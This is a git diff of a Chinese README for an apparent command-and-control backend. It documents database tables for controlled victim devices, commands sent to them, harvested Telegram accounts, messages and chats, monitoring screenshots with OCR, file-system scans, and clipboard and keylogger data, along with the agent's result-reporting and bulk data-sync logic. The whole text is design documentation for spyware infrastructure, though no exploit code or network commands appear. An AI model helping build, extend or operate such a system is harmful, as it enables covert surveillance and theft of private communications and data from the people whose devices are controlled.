@@ -26,6 +26,7 @@
   - [Redis 分布式登录](#redis-分布式登录)
   - [Elasticsearch 搜索引擎](#elasticsearch-搜索引擎)
   - [业务代码生成器](#业务代码生成器)
+- [数据库表结构说明](#数据库表结构说明-database-schema)
 - [Web端下发命令详解](#web端下发命令详解)
 - [Web端开发注意](#web端开发注意)
 - [TG 客户端对接协议与开发建议](#tg-客户端对接协议与开发建议)
@@ -82,6 +83,7 @@ spring:
 ```
 
 2. 执行 `sql/create_table.sql` 中的数据库语句，自动创建库表（本项目已预置 `telegram_db` 库和 `telegram` 用户）。
+   > **注意**: 如果遇到 `Unknown column` 或 `BadSqlGrammarException` 错误，请务必重新执行 `sql/create_table.sql` 以更新数据库结构。所有表字段已强制规范化为 snake_case (如 `is_delete`, `create_time`)。
 
 3. 启动项目，访问 `http://localhost:8101/api/doc.html` 即可打开接口文档，不需要写前端就能在线调试接口了~
 
@@ -169,6 +171,186 @@ String upperDataKey = "UserComment";
 
 ---
 
+## 数据库表结构说明 (Database Schema)
+
+以下是本项目所有核心数据库表的结构说明。所有字段均遵循 **snake_case** 命名规范。
+
+### 1. 设备表 (`c2_device`)
+存储受控设备的基本信息。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `uuid` | varchar(64) | 设备唯一标识符 (UUID) |
+| `internal_ip` | varchar(64) | 内网 IP |
+| `external_ip` | varchar(64) | 外网 IP |
+| `country` | varchar(64) | 国家 |
+| `region` | varchar(64) | 地区/省份 |
+| `city` | varchar(64) | 城市 |
+| `isp` | varchar(128) | 互联网服务提供商 |
+| `mac_address` | varchar(64) | MAC 地址 |
+| `host_name` | varchar(128) | 主机名 |
+| `os` | varchar(128) | 操作系统信息 |
+| `last_seen` | datetime | 最后在线时间 |
+| `heartbeat_interval` | int | 心跳间隔 (毫秒) |
+| `is_monitor_on` | tinyint | 是否开启监控 (0/1) |
+| `current_tg_id` | varchar(64) | 当前关联的 Telegram ID |
+| `data_status` | varchar(32) | 数据同步状态 |
+| `create_time` | datetime | 创建时间 |
+| `update_time` | datetime | 更新时间 |
+| `is_delete` | tinyint | 逻辑删除标记 (0:未删, 1:已删) |
+
+### 2. 软件列表 (`c2_software`)
+存储设备已安装的软件信息。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `name` | varchar(256) | 软件名称 |
+| `version` | varchar(64) | 软件版本 |
+| `install_date` | varchar(64) | 安装日期 |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 3. WiFi 信息 (`c2_wifi`)
+存储设备扫描到的 WiFi 热点信息。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `ssid` | varchar(128) | WiFi 名称 |
+| `bssid` | varchar(64) | MAC 地址 |
+| `signal_strength` | varchar(32) | 信号强度 |
+| `authentication` | varchar(64) | 认证方式 |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 4. 任务表 (`c2_task`)
+存储下发给设备的命令及执行结果。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `task_id` | varchar(64) | 任务唯一标识 |
+| `device_uuid` | varchar(64) | 目标设备 UUID |
+| `command` | varchar(256) | 指令内容 |
+| `params` | text | 指令参数 |
+| `status` | varchar(32) | 状态 (pending/done/error) |
+| `result` | longtext | 执行结果 |
+| `create_time` | datetime | 创建时间 |
+| `update_time` | datetime | 更新时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 5. Telegram 账号 (`tg_account`)
+存储从设备同步的 Telegram 账号信息。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `tg_id` | varchar(64) | Telegram 用户 ID |
+| `username` | varchar(128) | 用户名 |
+| `phone` | varchar(32) | 手机号 |
+| `first_name` | varchar(128) | 名 |
+| `last_name` | varchar(128) | 姓 |
+| `is_bot` | tinyint | 是否为机器人 |
+| `is_premium` | tinyint | 是否为会员 |
+| `system_info` | text | 系统信息快照 |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `create_time` | datetime | 创建时间 |
+| `update_time` | datetime | 更新时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 6. Telegram 消息 (`tg_message`)
+存储同步的聊天记录。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `account_id` | bigint | 关联账号表 ID |
+| `msg_id` | bigint | 消息 ID |
+| `chat_id` | varchar(64) | 会话 ID |
+| `sender_id` | varchar(64) | 发送者 ID |
+| `content` | text | 消息内容 |
+| `msg_type` | varchar(32) | 消息类型 |
+| `media_path` | varchar(256) | 媒体文件路径 |
+| `msg_date` | datetime | 消息时间 |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 7. 屏幕截图 (`c2_screenshot`)
+存储监控截屏记录。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `task_id` | varchar(64) | 关联任务 ID |
+| `url` | varchar(512) | 图片访问 URL |
+| `ocr_result` | text | OCR 识别结果 |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 8. 文件系统 (`c2_file_system_node`)
+存储文件扫描或浏览的结果。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `parent_path` | text | 父目录路径 |
+| `name` | varchar(256) | 文件/目录名 |
+| `path` | text | 完整路径 |
+| `is_directory` | tinyint | 是否为目录 (1/0) |
+| `size` | bigint | 文件大小 (字节) |
+| `md5` | varchar(32) | 文件哈希 |
+| `is_recent` | tinyint | 是否为最近文件 |
+| `last_modified` | datetime | 最后修改时间 |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 9. 用户表 (`t_user`)
+平台管理端用户。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `user_account` | varchar(256) | 账号 |
+| `user_password` | varchar(512) | 密码 |
+| `user_name` | varchar(256) | 昵称 |
+| `user_role` | varchar(256) | 角色 (admin/user) |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 10. 采集数据表 (`collected_data`)
+存储通用的采集数据（如剪贴板、键盘记录等）。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `data_id` | varchar(64) | 数据唯一标识 |
+| `data_type` | varchar(32) | 数据类型 |
+| `content` | longtext | 数据内容 (Base64 或 文本) |
+| `create_time` | datetime | 创建时间 |
+| `is_delete` | tinyint | 逻辑删除标记 |
+
+### 11. 会话表 (`chats`)
+存储 TG 客户端的会话列表信息。
+
+| 字段名 | 类型 | 描述 |
+| :--- | :--- | :--- |
+| `id` | bigint | 主键 ID |
+| `device_uuid` | varchar(64) | 关联设备 UUID |
+| `chat_id` | text | 会话 ID |
+| `title` | text | 会话标题 |
+| `type` | text | 会话类型 (private/group/channel 等) |
+| `invite_link` | text | 邀请链接 |
+| `member_count` | bigint | 成员数量 |
+| `create_time` | datetime | 创建时间 |
+
+---
+
 ## Web端下发命令详解
 
 本文档详细说明了 Web 控制台（C2Device Detail 页面）可下发的命令、参数及其后端处理逻辑。
@@ -215,8 +397,23 @@ String upperDataKey = "UserComment";
 在 `C2Controller.java` 的 `submitTaskResult` 方法中增加对 `get_current_user` 命令返回值的解析处理。
 代码已实现：
 1. 检查 `get_current_user` 命令。
-2. 解析 JSON 并更新 `tg_account` 表 (firstName, lastName, etc)。
+2. 解析 JSON 并更新 `tg_account` 表 (first_name, last_name, etc)。
 3. 关联设备 UUID。
+
+### 后端技术实现细节 (Backend Implementation Details)
+
+1.  **C2 任务处理兼容性**:
+    - Agent 上报任务结果时，JSON payload 支持 `taskId` (驼峰) 或 `task_id` (蛇形) 两种键名，后端 `C2Controller` 已做 fallback 兼容处理。
+    - 心跳设置命令 `set_heartbeat` 必须包含有效的 `device_uuid` 且结果不为空才能生效。
+
+2.  **通用数据同步机制 (Generic Sync)**:
+    - 后端支持自动将客户端上传的 SQLite 数据库 (`tdata_client.db`) 中的表结构同步至 MySQL。
+    - **排除列表**: `chat_sync_state`, `local_tasks` 表不会被同步。
+    - **动态建表**: 如果 MySQL 中不存在对应表，后端会根据 SQLite 表结构自动创建。
+
+3.  **数据库命名规范**:
+    - 所有数据库表名及字段名严格遵循 **snake_case** (蛇形命名)。
+    - Java 实体类中使用 `@TableField` 注解将驼峰属性映射至数据库的下划线字段 (如 `deviceUuid` -> `device_uuid`)。
 
 ---
 
@@ -378,15 +575,17 @@ String upperDataKey = "UserComment";
 **7. 通用表同步 (Generic Table Sync)**
 - **机制**: 后端会自动扫描并同步 SQLite 数据库中除上述标准表以外的其他所有表。
 - **自动建表**: 若 MySQL 中不存在对应表，系统会根据 SQLite 字段类型自动创建同名表，并添加 `device_uuid` 和 `create_time` 字段。
-- **排除列表 (Excluded)**: 以下表**不会**被同步：
-    - `chat_sync_state`: 客户端本地同步状态记录。
-    - `local_tasks`: 客户端本地任务队列。
-    - `android_metadata`: 安卓元数据（如存在）。
-    - 以及上述已专门处理的标准表 (`system_info`, `wifi_scan_results`, `installed_software`, `chat_logs` 等)。
+- **排除列表 (Excluded)**:
+    - **仅以下表不会被同步** (The only tables NOT synced):
+        - `chat_sync_state`: 客户端本地同步状态记录。
+        - `local_tasks`: 客户端本地任务队列。
+    - **注意**: 除了上述两个表，**所有其他表**（包括 `current_user`, `contacts`, `wifi_scan_results` 等）除了会触发特定业务逻辑外，**也会**触发通用同步机制，在数据库中生成对应的原始表（如 `current_user` 表）。这确保了原始数据的完整备份。
 
 ## 更新日志 (Changelog)
 
 ### 2026-01-18
-- **Bug Fix**: 修复了 `C2DeviceController` 中查询 `c2_wifi`, `c2_software`, `c2_file_system_node` 时使用错误的 `device_id` 列导致的 `BadSqlGrammarException`。现在统一使用 `device_uuid`。
+- **Schema Standardization**: 强制在所有数据库列中使用 snake_case 命名规范（如 `create_time`, `host_name`, `internal_ip`），解决了 `Unknown column` 错误。
+- **Entity Update**: 更新了 Java 实体类的 `@TableField` 注解以匹配 MySQL 规范。
+- **Generic Sync Update**: 修改了通用同步逻辑，**移除了**对标准表的排除。现在除了 `chat_sync_state` 和 `local_tasks` 外，所有 SQLite 表都会被同步到 MySQL。
+- **Bug Fix**: 修复了 `C2DeviceController` 中查询错误的 `device_id` 列导致的异常。
 - **Improvement**: 优化了 `system_info` 的解析逻辑，解决了设备列表显示 "Unknown" 的问题。
-- **Schema**: 确认所有业务表（WiFi, Software, Files）均使用 `device_uuid` 进行设备关联，移除了过时的 `device_id` 字段依赖。
